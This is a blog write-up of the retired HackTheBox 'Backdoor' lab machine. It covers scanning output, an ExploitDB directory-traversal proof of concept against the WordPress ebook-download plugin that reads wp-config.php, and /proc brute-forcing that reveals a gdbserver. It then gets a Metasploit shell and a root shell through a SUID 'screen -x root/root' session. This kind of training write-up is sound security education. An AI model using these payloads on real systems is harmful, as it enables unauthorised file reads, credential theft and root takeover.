---
title: "HackTheBox Backdoor Write-Up"
date: 2022-04-23
slug: hackthebox-backdoor-write-up
excerpt: "The Backdoor machine on HackTheBox has just retired! This is my write-up about the Backdoor machine on HackTheBox. Here I detail the penetration testing steps…"
source: https://blog.nicpwns.com/hackthebox-backdoor-write-up-29d3d448d322
tags: ["hackthebox"]
---

<p>The Backdoor machine on HackTheBox has just retired! This is my write-up about the Backdoor machine on HackTheBox. Here I detail the penetration testing steps taken to scan, exploit, and privilege escalate on this target machine. This machine is categorized as easy and was retired on April 23, 2022.</p>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-1.png" alt="" /></figure>
<h3>Backdoor Summary</h3>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-2.png" alt="Backdoor logo." /></figure>
<h4>Target Information</h4>
<p><strong>IP Address:</strong> 10.10.11.125<br><strong>Hostname:</strong> backdoor.htb</p>
<h4>Synopsis</h4>
<p>A vulnerable WordPress plugin allows for local file inclusion. Local file inclusion provides read access to identify a GDB service running on a special port. The GDB service can be exploited for code execution and initial access. The screen utility with SUID allows for connection to an active root-level terminal session for root privileges.</p>
<h3>Scanning</h3>
<h4>Nmap</h4>
<p>The Nmap scan shows that there is an HTTP server on port <code>80/tcp</code> and some interesting service on port <code>1337/tcp</code>.</p>
<pre><code># nmap -sV -sC -p- 10.10.11.125
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-22 17:41 EDT
Nmap scan report for 10.10.11.125
Host is up (0.069s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &amp;#8211; Real-Life
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.18 seconds</code></pre>
<h4>HTTP</h4>
<p>We can see that the website is a plain site running on port <code>80/tcp</code>. Nothing here of interest.</p>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-3.png" alt="Backdoor website landing." /><figcaption>Backdoor website landing.</figcaption></figure>
<h4>Nikto</h4>
<p>Nikto tells us that there is WordPress running on the target and that a few interesting directories are available.</p>
<pre><code># nikto --host http://10.10.11.125/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.125
+ Target Hostname:    10.10.11.125
+ Target Port:        80
+ Start Time:         2022-04-22 17:41:43 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'link' found, with multiple values: (&lt;http://10.10.11.125/index.php/wp-json/&gt;; rel="https://api.w.org/",&lt;http://10.10.11.125/index.php/wp-json/wp/v2/pages/11&gt;; rel="alternate"; type="application/json",&lt;http://10.10.11.125/&gt;; rel=shortlink,)
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ OSVDB-3268: /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
+ /wp-login.php: Wordpress login found
+ 7889 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2022-04-22 17:50:14 (GMT-4) (511 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested</code></pre>
<h4>Gobuster</h4>
<p>Gobuster shows a few more interesting WordPress directories to check out.</p>
<pre><code># gobuster dir -u http://10.10.11.125/ -w /usr/share/wordlists/dirpwn.txt                   
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.125/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirpwn.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/22 17:41:55 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--&gt; http://10.10.11.125/]
/server-status        (Status: 403) [Size: 277]                         
/server-status        (Status: 403) [Size: 277]                         
/wp-admin             (Status: 301) [Size: 315] [--&gt; http://10.10.11.125/wp-admin/]
/wp-admin             (Status: 301) [Size: 315] [--&gt; http://10.10.11.125/wp-admin/]
/wp-content           (Status: 301) [Size: 317] [--&gt; http://10.10.11.125/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--&gt; http://10.10.11.125/wp-includes/]
/xmlrpc.php           (Status: 405) [Size: 42]                                        
===============================================================
2022/04/22 18:03:36 Finished
===============================================================</code></pre>
<h4>WPScan</h4>
<p>WPScan provided a lot of information, some of which I cut here to save space. The key information it found was a vulnerable ebook-download plugin.</p>
<pre><code># wpscan --url http://10.10.11.125/ -e ap,u --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
[+] URL: http://10.10.11.125/ [10.10.11.125]
[+] Started: Fri Apr 22 17:43:29 2022
Interesting Finding(s):
-----SNIP-----
[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:19:43 &lt;========================================================================&gt; (97836 / 97836) 100.00% Time: 00:19:43
[+] Checking Plugin Versions (via Passive and Aggressive Methods)
[i] Plugin(s) Identified:
[+] ebook-download
 | Location: http://10.10.11.125/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/ebook-download/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Ebook Download &lt; 1.2 - Directory Traversal
 |     Fixed in: 1.2
 |     References:
 |      - https://wpscan.com/vulnerability/13d5d17a-00a8-441e-bda1-2fd2b4158a6c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10924
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;==============================================================================&gt; (10 / 10) 100.00% Time: 00:00:00
[i] User(s) Identified:
[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.11.125/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
[+] Finished: Fri Apr 22 18:03:33 2022
[+] Requests Done: 97915
[+] Cached Requests: 7
[+] Data Sent: 26.27 MB
[+] Data Received: 28.875 MB
[+] Memory used: 468.273 MB
[+] Elapsed time: 00:20:04</code></pre>
<h3>Exploit</h3>
<p>The identified “ebook-download” plugin can be accessed directly with a directory listing.</p>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-4.png" alt="Directory listing for WordPress plugins." /><figcaption>Directory listing for WordPress plugins.</figcaption></figure>
<p>Looking at the plugin’s readme, we can see it is version 1.1.</p>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-5.png" alt="Readme.txt for ebook-download plugin showing version 1.1." /><figcaption>Readme.txt for ebook-download plugin showing version 1.1.</figcaption></figure>
<p>A directory traversal vulnerability is present in “ebook-download” version 1.1 and there is an exploit available in <a href="https://www.exploit-db.com/exploits/39575">ExploitDB</a>. Let’s try it.</p>
<h4>WordPress Plugin eBook Download 1.1 — Directory Traversal</h4>
<pre><code># Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal
# Exploit Author: Wadeek
# Website Author: https://github.com/Wad-Deek
# Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip
# Version: 1.1
# Tested on: Xampp on Windows7
 
[Version Disclosure]
======================================
http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt
======================================
 
[PoC]
======================================
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
======================================</code></pre>
<p>Run the exploit from ExploitDB.</p>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-6.png" alt="Successfully viewing wp-config.php using local file inclusion vulnerability." /><figcaption>Successfully viewing wp-config.php using local file inclusion vulnerability.</figcaption></figure>
<p>The exploit works! We’re able to read local files on the target. We can even get the WordPress database password but this won’t do any good because we don’t have a way to access the database. There doesn’t seem to be any password reuse for SSH or the WordPress admin login either. Some other file will need to be read to gain initial access.</p>
<h4>Brute-Force /proc</h4>
<p>This <a href="https://zsahi.wordpress.com/2018/09/10/file-inclusion/">blog post</a> suggests brute-forcing the <code>/proc</code> directory for different PIDs to identify running services on the system. Remember, <em>everything</em> in Linux is a file. This may help us identify what service is really running on port <code>1337/tcp</code>!</p>
<p>Using Burp Suite Intruder, I brute-forced web requests to identify any possible PIDs running a service on the target. The directory checked was <code>/proc/[PID]/cmdline</code>. I eventually got a hit! PID 844 showed <code>gdbserver</code> listening on port <code>1337/tcp</code>. That's our target service.</p>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-7.png" alt="Using Burp Suite Intruder to identify gdbserver running on PID 844." /><figcaption>Using Burp Suite Intruder to identify gdbserver running on PID 844.</figcaption></figure>
<h4>Metasploit Console</h4>
<p>A quick Google search for connecting to <code>gdbserver</code> revealed that there is a <a href="https://www.rapid7.com/db/modules/exploit/multi/gdb/gdb_server_exec/">Metasploit module</a> to obtain a shell on the target. A quick Metasploit setup was needed and then I had initial user-level access to the target.</p>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-8.png" alt="Using Metasploit Console to obtain a Meterpreter shell." /><figcaption>Using Metasploit Console to obtain a Meterpreter shell.</figcaption></figure>
<h3>Enumeration</h3>
<p>Going through my normal privilege escalation processes of checking sudo, SUIDs, writable files, etc. I eventually came around to running <a href="https://github.com/DominicBreuker/pspy">Pspy</a> to see if I could pick up on any processes running that I didn’t see before. I ended up seeing an interesting <code>screen</code> command running with the name of root.</p>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-9.png" alt="Using Pspy to identify an interesting screen process running." /><figcaption>Using Pspy to identify an interesting screen process running.</figcaption></figure>
<p>Pairing this information with seeing SUID set for <code>screen</code> in my previous enumeration, this looked like a privilege escalation route.</p>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-10.png" alt="Checking for binaries with SUID bits set." /><figcaption>Checking for binaries with SUID bits set.</figcaption></figure>
<h3>Root</h3>
<p>Checking the help menu for <code>screen</code> showed an interesting <code>-x</code> option that allows us to "Attach to a not detached screen."</p>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-11.png" alt="Viewing the help menu for screen to identify the -x argument." /><figcaption>Viewing the help menu for screen to identify the -x argument.</figcaption></figure>
<p>At first, attempting this in my Meterpreter shell caused some issues, so I had to upgrade my shell and work through those issues first.</p>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-12.png" alt="Screen requires connection to a terminal." /><figcaption>Screen requires connection to a terminal.</figcaption></figure>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-13.png" alt="Upgrading Meterpreter shell with using a Python trick." /><figcaption>Upgrading Meterpreter shell with using a Python trick.</figcaption></figure>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-14.png" alt="Screen requires a terminal type to be set." /><figcaption>Screen requires a terminal type to be set.</figcaption></figure>
<p>Setting a terminal type then running the following command worked!</p>
<pre><code>export TERM=xterm
screen -x root/root</code></pre>
<p>We have the root-level shell.</p>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-15.png" alt="Obtaining a root shell." /><figcaption>Obtaining a root shell.</figcaption></figure>
<h3>Loot</h3>
<p>Other than the points on HackTheBox, the lessons learned are the real treasures for this box.</p>
<ol><li>Using file read vulnerabilities to check for running processes in <code>/proc</code> is extremely valuable! The methodology used for this box, and other methodologies like the one <a href="https://xen0vas.github.io/Exploiting-the-LFI-vulnerability-using-the-proc-self-stat-method/#">mentioned here</a> are very useful when trying to gain initial access from a file read vulnerability.</li><li><a href="https://github.com/DominicBreuker/pspy">Pspy</a> is awesome. As much as Pspy always seems to be a last resort for me, it always wins. The tool gives visibility into activity on the box that you would never see otherwise.</li></ol>
<figure><img src="/writeups/hackthebox-backdoor-write-up/img-16.png" alt="" /></figure>
<p>Thank you for reading my write-up for the Backdoor machine on HackTheBox. Be sure to check out my other write-ups for <a href="/notes?tag=hackthebox">HackTheBox</a>!</p>
